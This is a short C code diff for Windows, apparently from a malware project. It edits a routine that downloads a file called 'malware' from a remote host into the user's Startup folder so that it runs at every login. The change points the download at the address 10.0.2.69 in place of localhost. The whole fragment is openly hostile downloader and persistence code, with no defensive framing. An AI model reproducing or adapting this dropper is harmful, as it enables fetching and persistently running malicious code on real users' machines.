@@ -15,5 +15,5 @@ int main(void) {
     SHGetSpecialFolderPathA(0, folderPath, CSIDL_STARTUP, 0);
     strcat(folderPath, "\\");
     strcat(folderPath, szFileName);
-    URLDownloadToFileA(0,"http://127.0.0.1/malware",folderPath,0,0);
+    URLDownloadToFileA(0,"http://10.0.2.69/malware",folderPath,0,0);
 }
